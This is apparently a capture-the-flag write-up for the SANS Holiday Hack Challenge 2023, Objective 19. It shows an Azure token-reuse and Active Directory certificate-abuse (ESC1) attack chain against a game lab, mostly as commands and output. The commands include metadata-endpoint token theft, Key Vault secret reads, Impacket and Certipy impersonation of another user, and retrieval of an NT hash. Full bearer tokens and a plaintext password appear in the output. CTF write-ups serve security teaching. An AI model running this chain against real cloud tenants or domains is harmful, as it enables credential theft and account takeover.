# Objective 19: Active Directory
**Location: Pixel Island: Raincaster Cliffs**  
**Hints provided by Ribb Bonbowford**

This objective is a continuation of [Objective 17: Certificate SSHenanigans](https://github.com/joergschwarzwaelder/hhc2023/tree/main/Objective-17). It is a prerequisite to have this already cleared.

The aim is to get hold of the name of the secret file stored on the "FileShare".

With the help of the Bearer token from objective 17, we can check in https://management.azure.com for resources:
```
joergen@northpole:~$ curl -H 'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6IlQxU3QtZExUdnlXUmd4Ql82NzZ1OGtyWFMtSSIsImtpZCI6IlQxU3QtZExUdnlXUmd4Ql82NzZ1OGtyWFMtSSJ9.eyJhdWQiOiJodHRwczovL21hbmFnZW1lbnQuYXp1cmUuY29tLyIsImlzcyI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzkwYTM4ZWRhLTQwMDYtNGRkNS05MjRjLTZjYTU1Y2FjYzE0ZC8iLCJpYXQiOjE3MDIxNTE4MTcsIm5iZiI6MTcwMjE1MTgxNywiZXhwIjoxNzAyMjM4NTE3LCJhaW8iOiJFMlZnWVBCeS83NzZRa3NrcDh1RC9qZThaZ21xQUE9PSIsImFwcGlkIjoiYjg0ZTA2ZDMtYWJhMS00YmNjLTk2MjYtMmUwZDc2Y2JhMmNlIiwiYXBwaWRhY3IiOiIyIiwiaWRwIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvOTBhMzhlZGEtNDAwNi00ZGQ1LTkyNGMtNmNhNTVjYWNjMTRkLyIsImlkdHlwIjoiYXBwIiwib2lkIjoiNjAwYTNiYzgtN2UyYy00NGU1LThhMjctMThjM2ViOTYzMDYwIiwicmgiOiIwLkFGRUEybzZqa0FaQTFVMlNUR3lsWEt6QlRVWklmM2tBdXRkUHVrUGF3ZmoyTUJQUUFBQS4iLCJzdWIiOiI2MDBhM2JjOC03ZTJjLTQ0ZTUtOGEyNy0xOGMzZWI5NjMwNjAiLCJ0aWQiOiI5MGEzOGVkYS00MDA2LTRkZDUtOTI0Yy02Y2E1NWNhY2MxNGQiLCJ1dGkiOiI0anVoQTFUOVdFYWlGZWxpeFRITEFBIiwidmVyIjoiMS4wIiwieG1zX2F6X3JpZCI6Ii9zdWJzY3JpcHRpb25zLzJiMDk0MmYzLTliY2EtNDg0Yi1hNTA4LWFiZGFlMmRiNWU2NC9yZXNvdXJjZWdyb3Vwcy9ub3J0aHBvbGUtcmcxL3Byb3ZpZGVycy9NaWNyb3NvZnQuQ29tcHV0ZS92aXJ0dWFsTWFjaGluZXMvc3NoLXNlcnZlci12bSIsInhtc19jYWUiOiIxIiwieG1zX21pcmlkIjoiL3N1YnNjcmlwdGlvbnMvMmIwOTQyZjMtOWJjYS00ODRiLWE1MDgtYWJkYWUyZGI1ZTY0L3Jlc291cmNlZ3JvdXBzL25vcnRocG9sZS1yZzEvcHJvdmlkZXJzL01pY3Jvc29mdC5NYW5hZ2VkSWRlbnRpdHkvdXNlckFzc2lnbmVkSWRlbnRpdGllcy9ub3J0aHBvbGUtc3NoLXNlcnZlci1pZGVudGl0eSIsInhtc190Y2R0IjoxNjk4NDE3NTU3fQ.IS06qvLjcl38JvzRHeBPFoLZk5NREXcPFZyha4CITtcP-4VMHHPrfqpTPgl1U7C_ENrcJCbDrS3L6MhvkpcDwQ1tpAb7zuQrLL6Gk6IzpVMbeoYhqJi7LFiTARmC5TsSZdQF258R2fpqr9Py3Mug6QsVZH0nxrf-KDtzb_VrOvmulfZLsaEebjHJSEFFgaaUKPTNfTuQCMdhuGoV1t0CzTPEY_AVTfTBRlmtxiJMY4miBjINYqpUN5TWFQT7B81L_4HWu4hJoE_IbYE-4MWTI4VNPmiCeIMlJNM1o3XqI3AzVz3pGD5gv0UPa3Vi9bXIcG7_6eIeIInoeSNCHwMOSA' https://management.azure.com/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resources?api-version=2023-07-01 | jq .
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   489  100   489    0     0   1408      0 --:--:-- --:--:-- --:--:--  1405
{
  "value": [
    {
      "id": "/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.KeyVault/vaults/northpole-it-kv",
      "name": "northpole-it-kv",
      "type": "Microsoft.KeyVault/vaults",
      "location": "eastus",
      "tags": {}
    },
    {
      "id": "/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.KeyVault/vaults/northpole-ssh-certs-kv",
      "name": "northpole-ssh-certs-kv",
      "type": "Microsoft.KeyVault/vaults",
      "location": "eastus",
      "tags": {}
    }
  ]
}
```

The second one is used by the web application of objective 17, so we will explore now "northpole-it-kv".
```
joergen@northpole:~$ curl -H 'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6IlQxU3QtZExUdnlXUmd4Ql82NzZ1OGtyWFMtSSIsImtpZCI6IlQxU3QtZExUdnlXUmd4Ql82NzZ1OGtyWFMtSSJ9.eyJhdWQiOiJodHRwczovL21hbmFnZW1lbnQuYXp1cmUuY29tLyIsImlzcyI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzkwYTM4ZWRhLTQwMDYtNGRkNS05MjRjLTZjYTU1Y2FjYzE0ZC8iLCJpYXQiOjE3MDIxNTE4MTcsIm5iZiI6MTcwMjE1MTgxNywiZXhwIjoxNzAyMjM4NTE3LCJhaW8iOiJFMlZnWVBCeS83NzZRa3NrcDh1RC9qZThaZ21xQUE9PSIsImFwcGlkIjoiYjg0ZTA2ZDMtYWJhMS00YmNjLTk2MjYtMmUwZDc2Y2JhMmNlIiwiYXBwaWRhY3IiOiIyIiwiaWRwIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvOTBhMzhlZGEtNDAwNi00ZGQ1LTkyNGMtNmNhNTVjYWNjMTRkLyIsImlkdHlwIjoiYXBwIiwib2lkIjoiNjAwYTNiYzgtN2UyYy00NGU1LThhMjctMThjM2ViOTYzMDYwIiwicmgiOiIwLkFGRUEybzZqa0FaQTFVMlNUR3lsWEt6QlRVWklmM2tBdXRkUHVrUGF3ZmoyTUJQUUFBQS4iLCJzdWIiOiI2MDBhM2JjOC03ZTJjLTQ0ZTUtOGEyNy0xOGMzZWI5NjMwNjAiLCJ0aWQiOiI5MGEzOGVkYS00MDA2LTRkZDUtOTI0Yy02Y2E1NWNhY2MxNGQiLCJ1dGkiOiI0anVoQTFUOVdFYWlGZWxpeFRITEFBIiwidmVyIjoiMS4wIiwieG1zX2F6X3JpZCI6Ii9zdWJzY3JpcHRpb25zLzJiMDk0MmYzLTliY2EtNDg0Yi1hNTA4LWFiZGFlMmRiNWU2NC9yZXNvdXJjZWdyb3Vwcy9ub3J0aHBvbGUtcmcxL3Byb3ZpZGVycy9NaWNyb3NvZnQuQ29tcHV0ZS92aXJ0dWFsTWFjaGluZXMvc3NoLXNlcnZlci12bSIsInhtc19jYWUiOiIxIiwieG1zX21pcmlkIjoiL3N1YnNjcmlwdGlvbnMvMmIwOTQyZjMtOWJjYS00ODRiLWE1MDgtYWJkYWUyZGI1ZTY0L3Jlc291cmNlZ3JvdXBzL25vcnRocG9sZS1yZzEvcHJvdmlkZXJzL01pY3Jvc29mdC5NYW5hZ2VkSWRlbnRpdHkvdXNlckFzc2lnbmVkSWRlbnRpdGllcy9ub3J0aHBvbGUtc3NoLXNlcnZlci1pZGVudGl0eSIsInhtc190Y2R0IjoxNjk4NDE3NTU3fQ.IS06qvLjcl38JvzRHeBPFoLZk5NREXcPFZyha4CITtcP-4VMHHPrfqpTPgl1U7C_ENrcJCbDrS3L6MhvkpcDwQ1tpAb7zuQrLL6Gk6IzpVMbeoYhqJi7LFiTARmC5TsSZdQF258R2fpqr9Py3Mug6QsVZH0nxrf-KDtzb_VrOvmulfZLsaEebjHJSEFFgaaUKPTNfTuQCMdhuGoV1t0CzTPEY_AVTfTBRlmtxiJMY4miBjINYqpUN5TWFQT7B81L_4HWu4hJoE_IbYE-4MWTI4VNPmiCeIMlJNM1o3XqI3AzVz3pGD5gv0UPa3Vi9bXIcG7_6eIeIInoeSNCHwMOSA' https://management.azure.com/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.KeyVault/vaults/northpole-it-kv?api-version=2023-07-01 | jq .
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   902  100   902    0     0   1202      0 --:--:-- --:--:-- --:--:--  1201
{
  "id": "/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.KeyVault/vaults/northpole-it-kv",
  "name": "northpole-it-kv",
  "type": "Microsoft.KeyVault/vaults",
  "location": "eastus",
  "tags": {},
  "systemData": {
    "createdBy": "thomas@sanshhc.onmicrosoft.com",
    "createdByType": "User",
    "createdAt": "2023-10-30T13:17:02.532Z",
    "lastModifiedBy": "thomas@sanshhc.onmicrosoft.com",
    "lastModifiedByType": "User",
    "lastModifiedAt": "2023-10-30T13:17:02.532Z"
  },
  "properties": {
    "sku": {
      "family": "A",
      "name": "Standard"
    },
    "tenantId": "90a38eda-4006-4dd5-924c-6ca55cacc14d",
    "accessPolicies": [],
    "enabledForDeployment": false,
    "enabledForDiskEncryption": false,
    "enabledForTemplateDeployment": false,
    "enableSoftDelete": true,
    "softDeleteRetentionInDays": 90,
    "enableRbacAuthorization": true,
    "vaultUri": "https://northpole-it-kv.vault.azure.net/",
    "provisioningState": "Succeeded",
    "publicNetworkAccess": "Enabled"
  }
}
```
As the vault URI differs from "https://managent.azure.com/" (which is the validity scope of the current Bearer token), we need to head again to Alabaster's SSH host to generate a new Bearer token for the scope "https://vaut.azure.net":
```
alabaster@ssh-server-vm:~$ curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fvault.azure.net' -H Metadata:true -s
{"access_token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6IlQxU3QtZExUdnlXUmd4Ql82NzZ1OGtyWFMtSSIsImtpZCI6IlQxU3QtZExUdnlXUmd4Ql82NzZ1OGtyWFMtSSJ9.eyJhdWQiOiJodHRwczovL3ZhdWx0LmF6dXJlLm5ldCIsImlzcyI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzkwYTM4ZWRhLTQwMDYtNGRkNS05MjRjLTZjYTU1Y2FjYzE0ZC8iLCJpYXQiOjE3MDIyMDE1NjUsIm5iZiI6MTcwMjIwMTU2NSwiZXhwIjoxNzAyMjg4MjY1LCJhaW8iOiJFMlZnWUpqeWZzTGNtVzkzblMxVkVMeGdNL2xOSEFBPSIsImFwcGlkIjoiYjg0ZTA2ZDMtYWJhMS00YmNjLTk2MjYtMmUwZDc2Y2JhMmNlIiwiYXBwaWRhY3IiOiIyIiwiaWRwIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvOTBhMzhlZGEtNDAwNi00ZGQ1LTkyNGMtNmNhNTVjYWNjMTRkLyIsIm9pZCI6IjYwMGEzYmM4LTdlMmMtNDRlNS04YTI3LTE4YzNlYjk2MzA2MCIsInJoIjoiMC5BRkVBMm82amtBWkExVTJTVEd5bFhLekJUVG16cU0taWdocEhvOGtQd0w1NlFKUFFBQUEuIiwic3ViIjoiNjAwYTNiYzgtN2UyYy00NGU1LThhMjctMThjM2ViOTYzMDYwIiwidGlkIjoiOTBhMzhlZGEtNDAwNi00ZGQ1LTkyNGMtNmNhNTVjYWNjMTRkIiwidXRpIjoiNGp1aEExVDlXRWFpRmVsaUU5UUJBUSIsInZlciI6IjEuMCIsInhtc19hel9yaWQiOiIvc3Vic2NyaXB0aW9ucy8yYjA5NDJmMy05YmNhLTQ4NGItYTUwOC1hYmRhZTJkYjVlNjQvcmVzb3VyY2Vncm91cHMvbm9ydGhwb2xlLXJnMS9wcm92aWRlcnMvTWljcm9zb2Z0LkNvbXB1dGUvdmlydHVhbE1hY2hpbmVzL3NzaC1zZXJ2ZXItdm0iLCJ4bXNfbWlyaWQiOiIvc3Vic2NyaXB0aW9ucy8yYjA5NDJmMy05YmNhLTQ4NGItYTUwOC1hYmRhZTJkYjVlNjQvcmVzb3VyY2Vncm91cHMvbm9ydGhwb2xlLXJnMS9wcm92aWRlcnMvTWljcm9zb2Z0Lk1hbmFnZWRJZGVudGl0eS91c2VyQXNzaWduZWRJZGVudGl0aWVzL25vcnRocG9sZS1zc2gtc2VydmVyLWlkZW50aXR5In0.IrOp9yPivtkf_YUB8zgVtIPOryZgE5lYAU7mBQee9vL0Bz0DAyCbhRque50OdOwnu3-lSbarlf16ziUpHP-dIaEJcPSNEWv4m0wyOr_b0M8Y7sF8YKkDjzDWtiez1wDDV94lWqQfRtHYEgp7ZHi0B4Mi75nKR3l-F6EjHtzdod0cbQ_sRbgGfZn9LYDE44oIg48FB_WwldCVG_wr2aFos29czDSl5i447PpvVr8jDyXoI_ZKOxbDuL4FGdlXi6FSXADBRC1q5b_NhFFsWZ0u--2Q9_CUJexEiElRYjQQtvudrV3IwI-dyaiaOSCpGckN_CzxeV0Ia8QjlRLtkf-pmw","client_id":"b84e06d3-aba1-4bcc-9626-2e0d76cba2ce","expires_in":"85726","expires_on":"1702288265","ext_expires_in":"86399","not_before":"1702201565","resource":"https://vault.azure.net","token_type":"Bearer"}
```

Digging deeper with this new token in the vault releals:
```
joergen@northpole:~$ curl -H 'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6IlQxU3QtZExUdnlXUmd4Ql82NzZ1OGtyWFMtSSIsImtpZCI6IlQxU3QtZExUdnlXUmd4Ql82NzZ1OGtyWFMtSSJ9.eyJhdWQiOiJodHRwczovL3ZhdWx0LmF6dXJlLm5ldCIsImlzcyI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzkwYTM4ZWRhLTQwMDYtNGRkNS05MjRjLTZjYTU1Y2FjYzE0ZC8iLCJpYXQiOjE3MDIyMDE1NjUsIm5iZiI6MTcwMjIwMTU2NSwiZXhwIjoxNzAyMjg4MjY1LCJhaW8iOiJFMlZnWUpqeWZzTGNtVzkzblMxVkVMeGdNL2xOSEFBPSIsImFwcGlkIjoiYjg0ZTA2ZDMtYWJhMS00YmNjLTk2MjYtMmUwZDc2Y2JhMmNlIiwiYXBwaWRhY3IiOiIyIiwiaWRwIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvOTBhMzhlZGEtNDAwNi00ZGQ1LTkyNGMtNmNhNTVjYWNjMTRkLyIsIm9pZCI6IjYwMGEzYmM4LTdlMmMtNDRlNS04YTI3LTE4YzNlYjk2MzA2MCIsInJoIjoiMC5BRkVBMm82amtBWkExVTJTVEd5bFhLekJUVG16cU0taWdocEhvOGtQd0w1NlFKUFFBQUEuIiwic3ViIjoiNjAwYTNiYzgtN2UyYy00NGU1LThhMjctMThjM2ViOTYzMDYwIiwidGlkIjoiOTBhMzhlZGEtNDAwNi00ZGQ1LTkyNGMtNmNhNTVjYWNjMTRkIiwidXRpIjoiNGp1aEExVDlXRWFpRmVsaUU5UUJBUSIsInZlciI6IjEuMCIsInhtc19hel9yaWQiOiIvc3Vic2NyaXB0aW9ucy8yYjA5NDJmMy05YmNhLTQ4NGItYTUwOC1hYmRhZTJkYjVlNjQvcmVzb3VyY2Vncm91cHMvbm9ydGhwb2xlLXJnMS9wcm92aWRlcnMvTWljcm9zb2Z0LkNvbXB1dGUvdmlydHVhbE1hY2hpbmVzL3NzaC1zZXJ2ZXItdm0iLCJ4bXNfbWlyaWQiOiIvc3Vic2NyaXB0aW9ucy8yYjA5NDJmMy05YmNhLTQ4NGItYTUwOC1hYmRhZTJkYjVlNjQvcmVzb3VyY2Vncm91cHMvbm9ydGhwb2xlLXJnMS9wcm92aWRlcnMvTWljcm9zb2Z0Lk1hbmFnZWRJZGVudGl0eS91c2VyQXNzaWduZWRJZGVudGl0aWVzL25vcnRocG9sZS1zc2gtc2VydmVyLWlkZW50aXR5In0.IrOp9yPivtkf_YUB8zgVtIPOryZgE5lYAU7mBQee9vL0Bz0DAyCbhRque50OdOwnu3-lSbarlf16ziUpHP-dIaEJcPSNEWv4m0wyOr_b0M8Y7sF8YKkDjzDWtiez1wDDV94lWqQfRtHYEgp7ZHi0B4Mi75nKR3l-F6EjHtzdod0cbQ_sRbgGfZn9LYDE44oIg48FB_WwldCVG_wr2aFos29czDSl5i447PpvVr8jDyXoI_ZKOxbDuL4FGdlXi6FSXADBRC1q5b_NhFFsWZ0u--2Q9_CUJexEiElRYjQQtvudrV3IwI-dyaiaOSCpGckN_CzxeV0Ia8QjlRLtkf-pmw' https://northpole-it-kv.vault.azure.net/secrets?api-version=7.4| jq .
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   244  100   244    0     0    514      0 --:--:-- --:--:-- --:--:--   514
{
  "value": [
    {
      "id": "https://northpole-it-kv.vault.azure.net/secrets/tmpAddUserScript",
      "attributes": {
        "enabled": true,
        "created": 1699564823,
        "updated": 1699564823,
        "recoveryLevel": "Recoverable+Purgeable",
        "recoverableDays": 90
      },
      "tags": {}
    }
  ],
  "nextLink": null
}


joergen@northpole:~$ curl -H 'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6IlQxU3QtZExUdnlXUmd4Ql82NzZ1OGtyWFMtSSIsImtpZCI6IlQxU3QtZExUdnlXUmd4Ql82NzZ1OGtyWFMtSSJ9.eyJhdWQiOiJodHRwczovL3ZhdWx0LmF6dXJlLm5ldCIsImlzcyI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzkwYTM4ZWRhLTQwMDYtNGRkNS05MjRjLTZjYTU1Y2FjYzE0ZC8iLCJpYXQiOjE3MDIyMDE1NjUsIm5iZiI6MTcwMjIwMTU2NSwiZXhwIjoxNzAyMjg4MjY1LCJhaW8iOiJFMlZnWUpqeWZzTGNtVzkzblMxVkVMeGdNL2xOSEFBPSIsImFwcGlkIjoiYjg0ZTA2ZDMtYWJhMS00YmNjLTk2MjYtMmUwZDc2Y2JhMmNlIiwiYXBwaWRhY3IiOiIyIiwiaWRwIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvOTBhMzhlZGEtNDAwNi00ZGQ1LTkyNGMtNmNhNTVjYWNjMTRkLyIsIm9pZCI6IjYwMGEzYmM4LTdlMmMtNDRlNS04YTI3LTE4YzNlYjk2MzA2MCIsInJoIjoiMC5BRkVBMm82amtBWkExVTJTVEd5bFhLekJUVG16cU0taWdocEhvOGtQd0w1NlFKUFFBQUEuIiwic3ViIjoiNjAwYTNiYzgtN2UyYy00NGU1LThhMjctMThjM2ViOTYzMDYwIiwidGlkIjoiOTBhMzhlZGEtNDAwNi00ZGQ1LTkyNGMtNmNhNTVjYWNjMTRkIiwidXRpIjoiNGp1aEExVDlXRWFpRmVsaUU5UUJBUSIsInZlciI6IjEuMCIsInhtc19hel9yaWQiOiIvc3Vic2NyaXB0aW9ucy8yYjA5NDJmMy05YmNhLTQ4NGItYTUwOC1hYmRhZTJkYjVlNjQvcmVzb3VyY2Vncm91cHMvbm9ydGhwb2xlLXJnMS9wcm92aWRlcnMvTWljcm9zb2Z0LkNvbXB1dGUvdmlydHVhbE1hY2hpbmVzL3NzaC1zZXJ2ZXItdm0iLCJ4bXNfbWlyaWQiOiIvc3Vic2NyaXB0aW9ucy8yYjA5NDJmMy05YmNhLTQ4NGItYTUwOC1hYmRhZTJkYjVlNjQvcmVzb3VyY2Vncm91cHMvbm9ydGhwb2xlLXJnMS9wcm92aWRlcnMvTWljcm9zb2Z0Lk1hbmFnZWRJZGVudGl0eS91c2VyQXNzaWduZWRJZGVudGl0aWVzL25vcnRocG9sZS1zc2gtc2VydmVyLWlkZW50aXR5In0.IrOp9yPivtkf_YUB8zgVtIPOryZgE5lYAU7mBQee9vL0Bz0DAyCbhRque50OdOwnu3-lSbarlf16ziUpHP-dIaEJcPSNEWv4m0wyOr_b0M8Y7sF8YKkDjzDWtiez1wDDV94lWqQfRtHYEgp7ZHi0B4Mi75nKR3l-F6EjHtzdod0cbQ_sRbgGfZn9LYDE44oIg48FB_WwldCVG_wr2aFos29czDSl5i447PpvVr8jDyXoI_ZKOxbDuL4FGdlXi6FSXADBRC1q5b_NhFFsWZ0u--2Q9_CUJexEiElRYjQQtvudrV3IwI-dyaiaOSCpGckN_CzxeV0Ia8QjlRLtkf-pmw' https://northpole-it-kv.vault.azure.net/secrets/tmpAddUserScript?api-version=7.4| jq .
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   639  100   639    0     0   1025      0 --:--:-- --:--:-- --:--:--  1025
{
  "value": "Import-Module ActiveDirectory; $UserName = \"elfy\"; $UserDomain = \"northpole.local\"; $UserUPN = \"$UserName@$UserDomain\"; $Password = ConvertTo-SecureString \"J4`ufC49/J4766\" -AsPlainText -Force; $DCIP = \"10.0.0.53\"; New-ADUser -UserPrincipalName $UserUPN -Name $UserName -GivenName $UserName -Surname \"\" -Enabled $true -AccountPassword $Password -Server $DCIP -PassThru",
  "id": "https://northpole-it-kv.vault.azure.net/secrets/tmpAddUserScript/ec4db66008024699b19df44f5272248d",
  "attributes": {
    "enabled": true,
    "created": 1699564823,
    "updated": 1699564823,
    "recoveryLevel": "Recoverable+Purgeable",
    "recoverableDays": 90
  },
  "tags": {}
}
```
So we have now the IP of the domain controller **10.0.0.53**, a valid user name **elfy** and the password for this user **J4`ufC49/J4766**

As the Impacket toolset is installed on the server, we are using it to test these credentials:
```
alabaster@ssh-server-vm:~/impacket$ ./smbclient.py northpole.local/elfy@10.0.0.53       
Impacket v0.11.0 - Copyright 2023 Fortra

Password:
Type help for list of commands

# ls
[-] No share selected
# shares
ADMIN$
C$
D$
FileShare
IPC$
NETLOGON
SYSVOL
# cd FileShare
[-] No share selected
# use FileShare
# ls
drw-rw-rw-          0  Sun Dec 10 01:13:44 2023 .
drw-rw-rw-          0  Sun Dec 10 01:13:41 2023 ..
-rw-rw-rw-     701028  Sun Dec 10 01:13:44 2023 Cookies.pdf
-rw-rw-rw-    1521650  Sun Dec 10 01:13:44 2023 Cookies_Recipe.pdf
-rw-rw-rw-      54096  Sun Dec 10 01:13:44 2023 SignatureCookies.pdf
drw-rw-rw-          0  Sun Dec 10 01:13:44 2023 super_secret_research
-rw-rw-rw-        165  Sun Dec 10 01:13:44 2023 todo.txt
# cat todo.txt
1. Bake some cookies.
2. Restrict access to C:\FileShare\super_secret_research to only researchers so everyone cant see the folder or read its contents
3. Profit

# 
```

So it seems that the access to "super_secret_research" is restricted to researchers.

```
alabaster@ssh-server-vm:~/.venv/bin$ ./ldapdomaindump -u northpole.local\\elfy -p 'J4`ufC49/J4766' 10.0.0.53

alabaster@ssh-server-vm:~/.venv/bin$ ./ldd2pretty --directory .

[...]
    +------------------------+
    | Users Infos            |
    +------------------------+
    
Account: NORTHPOLE\wombleycube	Name: wombleycube	Desc: (null)
Account: NORTHPOLE\elfy	Name: elfy	Desc: (null)
Account: NORTHPOLE\krbtgt	Name: krbtgt	Desc: Key Distribution Center Service Account
Account: NORTHPOLE\Guest	Name: Guest	Desc: Built-in account for guest access to the computer/domain
Account: NORTHPOLE\alabaster	Name: alabaster	Desc: Built-in account for administering the computer/domain

user:[wombleycube]
user:[elfy]
user:[krbtgt]
user:[Guest]
user:[alabaster]


    +------------------------+import os.path
    | Groups Infos           |
    +------------------------+
    
group:[researchers]

[...]

[+] Getting domain group memberships:
Group 'researchers' has member: NORTHPOLE\wombleycube

[...]
```
As "wombleycube" is the only user in the "researchers" group, we need to target him.

```
alabaster@ssh-server-vm:~/impacket$ ./certipy find -dc-ip 10.0.0.53 -target-ip 10.0.0.53 -vulnerable -u elfy@northpole.local
Certipy v4.8.2 - by Oliver Lyak (ly4k)

Password:
[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Trying to get CA configuration for 'northpole-npdc01-CA' via CSRA
[!] Got error while trying to get CA configuration for 'northpole-npdc01-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'northpole-npdc01-CA' via RRP
[*] Got CA configuration for 'northpole-npdc01-CA'
[*] Saved BloodHound data to '20231210143907_Certipy.zip'. Drag and drop the file into the BloodHound GUI from @ly4k
[*] Saved text output to '20231210143907_Certipy.txt'
[*] Saved JSON output to '20231210143907_Certipy.json'
alabaster@ssh-server-vm:~/impacket$ cat 20231210143907_Certipy.json
{
[...]
      "[!] Vulnerabilities": {
        "ESC1": "'NORTHPOLE.LOCAL\\\\Domain Users' can enroll, enrollee supplies subject and template allows client authentication"
      }
    }
  }
}
```
So we can request a certificate for any user.

```
alabaster@ssh-server-vm:~/impacket$ ./certipy req -username elfy@northpole.local -password 'J4`ufC49/J4766' -ca northpole-npdc01-CA -target 10.0.0.53 -template NorthPoleUsers -upn wombleycube@northpole.local
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[!] Failed to resolve: NORTHPOLE.LOCAL
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 54
[*] Got certificate with UPN 'wombleycube@northpole.local'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'wombleycube.pfx'
alabaster@ssh-server-vm:~/impacket$ certipy auth -pfx wombleycube.pfx -dc-ip 10.0.0.53
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: wombleycube@northpole.local
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'wombleycube.ccache'
[*] Trying to retrieve NT hash for 'wombleycube'
[*] Got hash for 'wombleycube@northpole.local': aad3b435b51404eeaad3b435b51404ee:5740373231597863662f6d50484d3e23

```

**Achievement: Ipsum**
<!--stackedit_data:
eyJoaXN0b3J5IjpbOTMxODkwMTk2LDEwODc4NTMxNDcsLTIwMT
AxOTI2M119
-->